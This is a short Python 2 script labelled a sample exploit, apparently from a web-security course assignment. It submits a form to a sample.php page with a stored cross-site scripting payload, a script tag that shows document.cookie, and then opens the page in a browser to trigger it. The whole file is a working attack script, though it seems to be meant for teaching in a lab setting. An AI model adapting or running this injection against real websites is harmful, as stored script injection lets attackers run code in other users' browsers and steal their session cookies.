#sample exploit for sample case
import urllib, urllib2, cookielib

# do POST to the form
url_2 = 'http://www.wsb.com/Assignment2/sample/sample.php'
# prepare the value of the form which includes the attack payload
values = dict(title='here i come', content='Exploit... <script>alert(document.cookie)</script>)' )
data = urllib.urlencode(values)
#submit the form
req = urllib2.Request(url_2, data)
rsp = urllib2.urlopen(req)
#read the return result
content = rsp.read()

import webbrowser
url = "http://www.wsb.com/Assignment2/sample/sample.php"
new = 2 #open in new window
webbrowser.open(url,new=new)
